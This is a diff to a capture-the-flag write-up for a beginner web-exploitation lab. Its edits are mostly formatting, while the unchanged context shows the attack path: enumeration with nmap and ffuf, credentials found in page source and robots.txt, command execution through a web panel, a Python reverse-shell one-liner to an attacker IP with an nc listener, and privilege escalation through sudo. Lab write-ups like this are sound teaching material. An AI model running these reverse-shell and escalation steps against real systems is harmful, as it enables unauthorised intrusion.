@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap
+### Nmap
 
 1. 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
 2. 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))
@@ -26,7 +26,7 @@ Note to self, remember username!
     Username: R1ckRul3s
 ```
 
-- http://$IP/robots.txt -> Wubbalubbadubdub
+- http://$IP/robots.txt -> `Wubbalubbadubdub`
 - http://$IP/assets/
 
 ![](images/2023-03-02-14-09-43.png)
@@ -38,14 +38,13 @@ $ ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/common.txt -e .php,.html,.txt
 ```
 
 ```
-assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
-denied.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
-index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38]
-index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38]
-login.php               [Status: 200, Size: 882, Words: 89, Lines: 26]
-portal.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
-robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2]
-
+assets     
+denied.php 
+index.html 
+index.html 
+login.php  
+portal.php 
+robots.txt 
 ```
 
 - try to login with username and password may be from robots.txt ?
@@ -53,9 +52,10 @@ robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2]
 - only portal.php has access, and others show `Only the REAL rick can view this page.`
 - under form found a comment
 
-```Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
-
 ```
+Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
+```
+- nothing special, can't decrypt with base64
 
 - from command panel, some linux command can execute, but some are disabled
 - `ls /home` -> rick and ubuntu
@@ -99,6 +99,8 @@ User www-data may run the following commands on ip-10-10-72-194.eu-west-1.comput
     (ALL) NOPASSWD: ALL
 ```
 
+## User Access
+
 - try to get reverse shell
 - listen with nc at port 4242 at your attack machine
 
@@ -121,6 +123,8 @@ export RHOST="10.11.8.57";export RPORT=4242;python3 -c 'import socket,os,pty;s=s
 - SUID
 85     40 -rwsr-xr-x   1 root     root               40128 May 16  2017 /bin/su
 ```
+
+## Root Access
 
 - then change `sudo su` to become root
 
